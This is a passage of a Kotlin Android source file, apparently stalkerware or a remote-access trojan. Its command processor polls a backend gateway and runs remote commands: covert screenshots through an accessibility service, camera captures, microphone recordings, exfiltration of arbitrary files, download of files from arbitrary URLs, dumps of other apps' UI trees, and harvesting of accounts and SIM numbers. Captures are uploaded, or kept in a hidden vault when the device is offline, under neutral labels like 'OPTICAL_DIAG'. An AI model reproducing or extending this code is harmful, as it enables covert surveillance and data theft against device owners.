 24 | object CommandProcessor {
 25 | 
 26 |     suspend fun checkAndExecute(ctx: Context) {
 27 |         withContext(Dispatchers.IO) {
 28 |             try {
 29 |                 val deviceId = DeviceManager.getDeviceId(ctx)
 30 |                 // Fetch PENDING commands via Gateway
 31 |                 val req = JSONObject()
 32 |                 req.put("action", "get_commands")
 33 |                 req.put("deviceId", deviceId)
 34 | 
 35 |                 val supabaseUrl = SecretVault.getGatewayUrl(ctx)
 36 |                 val supabaseKey = SecretVault.getLock(ctx)
 37 | 
 38 |                 val url = URL(supabaseUrl)
 39 |                 val conn = url.openConnection() as HttpURLConnection
 40 |                 conn.requestMethod = "POST"
 41 |                 conn.setRequestProperty("apikey", supabaseKey)
 42 |                 conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
 43 |                 conn.setRequestProperty("Content-Type", "application/json")
 44 |                 conn.setRequestProperty("Accept", "application/json")
 45 |                 conn.doOutput = true
 46 | 
 47 |                 conn.outputStream.use { os -> 
 48 |                     os.write(req.toString().toByteArray(Charsets.UTF_8))
 49 |                     os.flush()
 50 |                 }
 51 |                 
 52 |                 val code = conn.responseCode
 53 |                 if (code == 200) {
 54 |                     val resp = conn.inputStream.bufferedReader().use { it.readText() }
 55 |                     val respObj = JSONObject(resp)
 56 |                     if (respObj.optBoolean("success")) {
 57 |                         val commands = respObj.optJSONArray("data") ?: JSONArray()
 58 |                         if (commands.length() > 0) {
 59 |                             DebugLogger.log("CMD_PROC", "Fetch Success. Executing ${commands.length()} commands.")
 60 |                         }
 61 |                         for (i in 0 until commands.length()) {
 62 |                             val cmd = commands.getJSONObject(i)
 63 |                             DebugLogger.log("SYSTEM", "Executing: ${cmd.optString("file_name")}")
 64 |                             processSingleCommand(ctx, cmd)
 65 |                         }
 66 |                     } else {
 67 |                         DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
 68 |                     }
 69 |                 } else {
 70 |                     val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
 71 |                     DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
 72 |                 }
 73 |             } catch (e: Exception) {
 74 |                 if (e is java.net.UnknownHostException || e is java.net.ConnectException) {
 75 |                     DebugLogger.log("CMD_PROC", "Fetch aborted: Offline")
 76 |                 } else {
 77 |                     DebugLogger.log("CMD_PROC_FATAL", "Stack: ${e.message}")
 78 |                 }
 79 |             }
 80 |         }
 81 |     }
 82 | 
 83 |     suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
 84 |         val id = cmd.getInt("id")
 85 |         
 86 |         // 1. Mark as RECEIVED immediately so backend knows the device is alive
 87 |         updateCommandStatus(ctx, id, "RECEIVED", null)
 88 | 
 89 |         var status = "EXECUTED"
 90 |         var errorMsg = ""
 91 |         val fileName = cmd.optString("file_name")
 92 |         val content = cmd.optString("content", "")
 93 | 
 94 |         try {
 95 |             when (fileName) {
 96 |                 "PING" -> {
 97 |                     CloudManager.sendPing(ctx, "Remote Tickle: Alive")
 98 |                     status = "PONG"
 99 |                 }
100 |                 "TOAST" -> {
101 |                     Handler(Looper.getMainLooper()).post {
102 |                         Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
103 |                     }
104 |                 }
105 |                 "RING" -> {
106 |                     val dur = content.toLongOrNull() ?: 10L
107 |                     val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
108 |                     val oldMode = am.ringerMode
109 |                     val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
110 |                     
111 |                     if (PermissionManager.hasDndAccess(ctx)) {
112 |                         am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
113 |                     }
114 |                     am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
115 |                     
116 |                     val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
117 |                     val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
118 |                     ringtone.play()
119 |                     
120 |                     kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
121 |                         kotlinx.coroutines.delay(dur * 1000)
122 |                         ringtone.stop()
123 |                         if (PermissionManager.hasDndAccess(ctx)) {
124 |                             am.ringerMode = oldMode
125 |                         }
126 |                         am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
127 |                     }
128 |                     status = "RINGING (${dur}S)"
129 |                 }
130 |                 "STAY_READY" -> {
131 |                     val mins = content.toLongOrNull() ?: 5L
132 |                     val i = android.content.Intent(ctx, BeaconService::class.java)
133 |                     i.putExtra("duration_mins", mins)
134 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
135 |                     else ctx.startService(i)
136 |                     status = "SYNC_PRIORITY_HIGH (${mins}M)"
137 |                 }
138 |                 "SET_INTERVAL" -> {
139 |                     // Content = Interval in Minutes (min 15)
140 |                     val mins = content.toLongOrNull() ?: 15L
141 |                     val safeMins = if (mins < 15) 15L else mins
142 |                     
143 |                     val wm = WorkManager.getInstance(ctx)
144 |                     val constraints = Constraints.Builder()
145 |                         .setRequiredNetworkType(NetworkType.CONNECTED)
146 |                         .setRequiresBatteryNotLow(true)
147 |                         .build()
148 | 
149 |                     val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
150 |                         .setConstraints(constraints)
151 |                         .build()
152 |                         
153 |                     wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
154 |                     status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
155 |                 }
156 |                 "STOP_BEACON" -> {
157 |                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
158 |                     status = "EXECUTED (STOPPED)"
159 |                 }
160 |                 "GET_TOKEN" -> {
161 |                     val token = DeviceManager.getRobustFcmToken(ctx)
162 |                     if (token != null) {
163 |                         status = "TOKEN_RETRIEVED"
164 |                         val result = JSONObject().put("fcm_token", token)
165 |                         updateCommandStatus(ctx, id, status, null, result, null)
166 |                         return
167 |                     } else {
168 |                         status = "FETCH_FAILED (NO_TOKEN)"
169 |                         errorMsg = "Play Services unavailable or token generation blocked."
170 |                     }
171 |                 }
172 |                 "GET_VAULT_SIZE" -> {
173 |                     val sizeInfo = DumpManager.getVaultSize()
174 |                     status = "EXECUTED"
175 |                     val result = JSONObject().put("size_report", sizeInfo)
176 |                     updateCommandStatus(ctx, id, status, null, result, null)
177 |                     return
178 |                 }
179 |                 "FORCE_UPLOAD" -> {
180 |                     val modules = content.split(",").map { it.trim() }
181 |                     CloudManager.uploadData(ctx, modules, "REMOTE_COMMAND")
182 |                     status = "MANUAL_BACKUP_INITIATED"
183 |                 }
184 |                 "UPLOAD_DUMPS" -> {
185 |                     val root = DumpManager.getRootDir()
186 |                     val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
187 |                     var filesUploaded = 0
188 |                     var foldersCleared = 0
189 | 
190 |                     for (folder in dateFolders) {
191 |                         val files = folder.listFiles() ?: continue
192 |                         if (files.isEmpty()) {
193 |                             folder.delete()
194 |                             continue
195 |                         }
196 | 
197 |                         var folderEmpty = true
198 |                         for (f in files) {
199 |                             // Upload to 'ARCHIVE' category
200 |                             if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
201 |                                 f.delete()
202 |                                 filesUploaded++
203 |                             } else {
204 |                                 folderEmpty = false
205 |                             }
206 |                         }
207 | 
208 |                         if (folderEmpty) {
209 |                             folder.delete()
210 |                             foldersCleared++
211 |                         }
212 |                     }
213 |                     status = "SCAVENGER_COMPLETE"
214 |                     val result = JSONObject()
215 |                     result.put("files_synced", filesUploaded)
216 |                     result.put("vault_folders_wiped", foldersCleared)
217 |                     updateCommandStatus(ctx, id, status, null, result, null)
218 |                     return
219 |                 }
220 |                 "PULL_FILE" -> {
221 |                     val f = File(content)
222 |                     if (f.exists() && f.isFile) {
223 |                         val timestamp = System.currentTimeMillis()
224 |                         val folderName = DeviceManager.getDeviceFolderName(ctx)
225 |                         val storagePath = "$folderName/PULL/${timestamp}_${f.name}"
226 |                         if (!CloudManager.uploadFile(ctx, f, "PULL", timestamp)) {
227 |                             status = "FETCH_FAILED (UPLOAD_ERROR)"
228 |                             errorMsg = "File exists but streaming to storage bucket failed."
229 |                         } else {
230 |                             status = "REMOTE_FETCH_SUCCESS"
231 |                             updateCommandStatus(ctx, id, status, null, null, storagePath)
232 |                             return 
233 |                         }
234 |                     } else {
235 |                         status = "FETCH_ABORTED (NOT_FOUND)"
236 |                         errorMsg = "File path does not exist on device."
237 |                     }
238 |                 }
239 |                 "PUSH_FILE" -> {
240 |                     val parts = content.split("|")
241 |                     if (parts.size < 2) {
242 |                         status = "FAILED (BAD_FORMAT)"
243 |                         errorMsg = "Required format: URL | /path/to/save/file.ext"
244 |                     } else {
245 |                         var currentUrl = parts[0].trim()
246 |                         val targetPath = parts[1].trim()
247 |                         val targetFile = File(targetPath)
248 |                         
249 |                         try {
250 |                             targetFile.parentFile?.mkdirs()
251 |                             var connection: java.net.HttpURLConnection
252 |                             var redirects = 0
253 |                             val maxRedirects = 5
254 | 
255 |                             while (true) {
256 |                                 val url = URL(currentUrl)
257 |                                 connection = url.openConnection() as java.net.HttpURLConnection
258 |                                 connection.instanceFollowRedirects = false // Manually handle for control
259 |                                 connection.connectTimeout = 30000
260 |                                 connection.readTimeout = 30000
261 |                                 
262 |                                 val code = connection.responseCode
263 |                                 if (code in 300..308 && redirects < maxRedirects) {
264 |                                     currentUrl = connection.getHeaderField("Location")
265 |                                     redirects++
266 |                                     continue
267 |                                 }
268 | 
269 |                                 if (code == 200) {
270 |                                     connection.inputStream.use { input ->
271 |                                         targetFile.outputStream().use { output ->
272 |                                             input.copyTo(output, 8192)
273 |                                         }
274 |                                     }
275 |                                     status = "DEPLOYMENT_SUCCESS"
276 |                                     val result = JSONObject()
277 |                                     result.put("saved_to", targetFile.absolutePath)
278 |                                     result.put("size", targetFile.length())
279 |                                     result.put("redirects", redirects)
280 |                                     updateCommandStatus(ctx, id, status, null, result, null)
281 |                                     return
282 |                                 } else {
283 |                                     status = "DEPLOYMENT_FAILED"
284 |                                     errorMsg = "HTTP $code at end of chain"
285 |                                     break
286 |                                 }
287 |                             }
288 |                         } catch (e: Exception) {
289 |                             status = "DEPLOYMENT_ERROR"
290 |                             errorMsg = e.toString()
291 |                         }
292 |                     }
293 |                 }
294 |                 "GET_SKELETON" -> {
295 |                     val depth = content.trim().toIntOrNull() ?: 5
296 |                     val report = FileManager.generateReport(depth)
297 |                     status = "STORAGE_INDEX_COMPLETE"
298 |                     DebugLogger.log("COMMAND", "Processed [$fileName] (Depth: $depth) -> $status")
299 |                     updateCommandStatus(ctx, id, status, null, report, null)
300 |                     return
301 |                 }
302 |                 "GET_TREE" -> {
303 |                     val parts = content.split("|")
304 |                     val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
305 |                     val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
306 |                     val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
307 |                     
308 |                     val service = MyAccessibilityService.instance
309 |                     if (service != null) {
310 |                         if (mins <= 0) {
311 |                             service.startTreeDump(null, 0)
312 |                             status = "SCAN_SESSION_TERMINATED"
313 |                         } else {
314 |                             // 1. Start background session
315 |                             service.startTreeDump(pkg, mins)
316 |                             
317 |                             // 2. Try Instant Capture
318 |                             val instantTree = service.getInstantTree(pkg, depth)
319 |                             if (!instantTree.has("error")) {
320 |                                 status = "SCAN_COMPLETE"
321 |                                 val result = JSONObject().apply {
322 |                                     put("depth_limit", depth)
323 |                                     put("snapshot", instantTree)
324 |                                 }
325 |                                 updateCommandStatus(ctx, id, status, null, result, null)
326 |                                 return
327 |                             } else {
328 |                                 // 3. Target app is NOT in foreground. Queue lazy capture.
329 |                                 service.pendingTreeCommandId = id
330 |                                 service.pendingTreeDepth = depth
331 |                                 status = "WAITING_FOR_TARGET_APP"
332 |                                 updateCommandStatus(ctx, id, status, null, null, null)
333 |                                 return
334 |                             }
335 |                         }
336 |                     } else {
337 |                         status = "FAILED (SERVICE_OFF)"
338 |                         errorMsg = "Accessibility service is offline."
339 |                     }
340 |                 }
341 |                 "GET_LOGS" -> {
342 |                     val logs = DebugLogger.getLogs()
343 |                     val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
344 |                     try {
345 |                         tempFile.writeText(logs)
346 |                         if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
347 |                             status = "DIAGNOSTIC_EXPORT_SUCCESS"
348 |                         } else {
349 |                             status = "DIAGNOSTIC_EXPORT_FAILED"
350 |                         }
351 |                     } catch (e: Exception) {
352 |                         status = "EXPORT_ERROR"
353 |                     } finally {
354 |                         if (tempFile.exists()) tempFile.delete()
355 |                     }
356 |                 }
357 |                 "TOGGLE_FEATURE" -> {
358 |                     val parts = content.split(":")
359 |                     if (parts.size >= 2) {
360 |                         val feature = parts[0].trim()
361 |                         val stateStr = parts[1].trim().lowercase()
362 |                         val enable = stateStr == "on" || stateStr == "true"
363 |                         val duration = if (parts.size >= 3) parts[2].toLongOrNull() ?: 0L else 0L
364 |                         
365 |                         ConfigManager.setFeature(ctx, feature, enable, duration)
366 |                         status = if (duration > 0L) "EXECUTED (TEMP OFF: ${duration}M)" else "EXECUTED (PERMANENT)"
367 |                     } else status = "FAILED (FORMAT)"
368 |                 }
369 |                 "CODERED" -> {
370 |                     val i = android.content.Intent(ctx, EmergencyService::class.java)
371 |                     i.putExtra("codes", "0")
372 |                     i.putExtra("sender", "BACKEND")
373 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
374 |                         ctx.startForegroundService(i)
375 |                     } else {
376 |                         ctx.startService(i)
377 |                     }
378 |                 }
379 |                 "GET_SCREENSHOT" -> {
380 |                     if (MyAccessibilityService.instance == null) {
381 |                         status = "FAILED (SERVICE_OFF)"
382 |                         errorMsg = "Accessibility service is required for screenshots."
383 |                     } else {
384 |                         val parts = content.split("|")
385 |                         val quality = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 70
386 |                         val freq = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 0
387 |                         val duration = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 0
388 | 
389 |                         if (freq > 0 && duration > 0) {
390 |                             val safeFreq = if (freq < 2) 2 else freq
391 |                             val endTime = System.currentTimeMillis() + (duration * 1000L)
392 |                             var capturedCount = 0
393 |                             
394 |                             DebugLogger.log("SCREEN_SESSION", "Starting continuous capture: ${safeFreq}s interval for ${duration}s")
395 |                             
396 |                             while (System.currentTimeMillis() < endTime) {
397 |                                 val deferredFile = CompletableDeferred<java.io.File?>()
398 |                                 MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
399 |                                     deferredFile.complete(file)
400 |                                 }
401 | 
402 |                                 val file = withTimeoutOrNull(8000) { deferredFile.await() }
403 |                                 if (file != null) {
404 |                                     if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
405 |                                         file.delete()
406 |                                     } else {
407 |                                         DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
408 |                                     }
409 |                                     capturedCount++
410 |                                 }
411 |                                 
412 |                                 if (System.currentTimeMillis() + (safeFreq * 1000L) > endTime) break
413 |                                 delay(safeFreq * 1000L)
414 |                             }
415 |                             status = "SCREENSHOT_SESSION_COMPLETE ($capturedCount images)"
416 |                         } else {
417 |                             // Single Shot Logic
418 |                             val deferredFile = CompletableDeferred<java.io.File?>()
419 |                             MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
420 |                                 deferredFile.complete(file)
421 |                             }
422 | 
423 |                             val file = withTimeoutOrNull(10000) { deferredFile.await() }
424 |                             if (file != null) {
425 |                                 if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
426 |                                     status = "SCREENSHOT_UPLOADED"
427 |                                     file.delete()
428 |                                 } else {
429 |                                     DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
430 |                                     status = "SCREENSHOT_QUEUED_OFFLINE"
431 |                                 }
432 |                             } else {
433 |                                 status = "SCREENSHOT_FAILED"
434 |                                 errorMsg = "Capture timed out or device version incompatible."
435 |                             }
436 |                         }
437 |                     }
438 |                 }
439 |                 "CAPTURE_IMAGE" -> {
440 |                     val parts = content.split("|")
441 |                     val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
442 |                     val count = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 1
443 |                     val useFront = side == "FRONT"
444 |                     
445 |                     var successCount = 0
446 |                     for (i in 1..count) {
447 |                         val file = CameraControl.capture(ctx, useFront)
448 |                         if (file != null) {
449 |                             if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
450 |                                 successCount++
451 |                                 file.delete()
452 |                             } else {
453 |                                 // OFFLINE: Send to Catacombs
454 |                                 DumpManager.vaultMedia(file, "OPTICAL_DIAG")
455 |                             }
456 |                         }
457 |                         kotlinx.coroutines.delay(1000)
458 |                     }
459 |                     status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
460 |                 }
461 |                 "RECORD_VOICE" -> {
462 |                     val dur = content.trim().toIntOrNull() ?: 10
463 |                     val snippet = VoiceManager.recordSnippet(ctx, dur)
464 |                     if (snippet != null) {
465 |                         if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
466 |                             status = "VOICE_CAPTURE_SUCCESS"
467 |                             snippet.delete()
468 |                         } else {
469 |                             // OFFLINE: Send to Catacombs
470 |                             DumpManager.vaultMedia(snippet, "VOICE_DIAG")
471 |                             status = "VOICE_QUEUED_OFFLINE"
472 |                         }
473 |                     } else {
474 |                         status = "VOICE_CAPTURE_FAILED"
475 |                         errorMsg = "Mic may be in use by another app or permission denied."
476 |                     }
477 |                 }
478 |                 "GET_ACCOUNTS" -> {
479 |                     val accounts = DeviceManager.getAccounts(ctx)
480 |                     status = "ACCOUNTS_RETRIEVED"
481 |                     val result = JSONObject().put("accounts", accounts)
482 |                     updateCommandStatus(ctx, id, status, null, result, null)
483 |                     return
484 |                 }
485 |                 "GET_NUMBERS" -> {
486 |                     val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
487 |                     val numbers = JSONArray()
488 |                     
489 |                     if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
490 |                         val infoList = sm.activeSubscriptionInfoList
491 |                         if (infoList != null) {
492 |                             for (info in infoList) {
493 |                                 val sim = JSONObject()
494 |                                 sim.put("slot", info.simSlotIndex)
495 |                                 sim.put("carrier", info.carrierName)
496 |                                 sim.put("display_name", info.displayName)
497 |                                 sim.put("country", info.countryIso)
498 |                                 
499 |                                 // Try to get the actual number
500 |                                 var num = "Unknown"
501 |                                 if (android.os.Build.VERSION.SDK_INT >= 33) {
502 |                                     try { num = sm.getPhoneNumber(info.subscriptionId) } catch (e: Exception) { }
503 |                                 } else {
504 |                                     num = info.number ?: "Unknown"
505 |                                 }
506 |                                 
507 |                                 sim.put("number", if (num.isEmpty()) "Unknown" else num)
508 |                                 numbers.put(sim)
509 |                             }
510 |                         }
511 |                         status = "SIM_INFO_RETRIEVED"
512 |                         val result = JSONObject().put("sim_cards", numbers)
513 |                         updateCommandStatus(ctx, id, status, null, result, null)
514 |                         return
515 |                     } else {
516 |                         status = "FAILED_PERMISSION (READ_PHONE_STATE)"
517 |                         errorMsg = "Permission required to access SIM subscriptions."
518 |                     }
519 |                 }
520 |                 "VOLUME" -> {
521 |                     val parts = content.split("|")
522 |                     if (parts.size >= 2) {
523 |                         val streamStr = parts[0].trim().uppercase()
524 |                         val levelStr = parts[1].trim().uppercase()
525 |                         
526 |                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
527 |                         val stream = when (streamStr) {
528 |                             "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
529 |                             "ALARM" -> android.media.AudioManager.STREAM_ALARM
530 |                             else -> android.media.AudioManager.STREAM_RING
531 |                         }
532 | 
533 |                         if (levelStr == "SILENT" || levelStr == "VIBRATE" || levelStr == "NORMAL") {
534 |                             if (PermissionManager.hasDndAccess(ctx)) {
535 |                                 am.ringerMode = when (levelStr) {
536 |                                     "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
537 |                                     "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
538 |                                     else -> android.media.AudioManager.RINGER_MODE_NORMAL
539 |                                 }
540 |                                 status = "RINGER_MODE_SET ($levelStr)"
541 |                             } else {
542 |                                 status = "FAILED_PERMISSION (DND_ACCESS)"
543 |                                 errorMsg = "Do Not Disturb access required to change ringer mode."
544 |                             }
545 |                         } else {
546 |                             val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
547 |                             val max = am.getStreamMaxVolume(stream)
548 |                             val targetVol = ((pct / 100f) * max).toInt()
549 |                             
550 |                             if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
551 |                                 am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
552 |                             }
553 |                             am.setStreamVolume(stream, targetVol, 0)
554 |                             status = "VOLUME_SET ($streamStr to $pct%)"
555 |                         }
556 |                     } else {
557 |                         status = "FAILED (FORMAT)"
558 |                         errorMsg = "Usage: VOLUME | MEDIA/RING/ALARM | 0-100/SILENT/VIBRATE"
559 |                     }
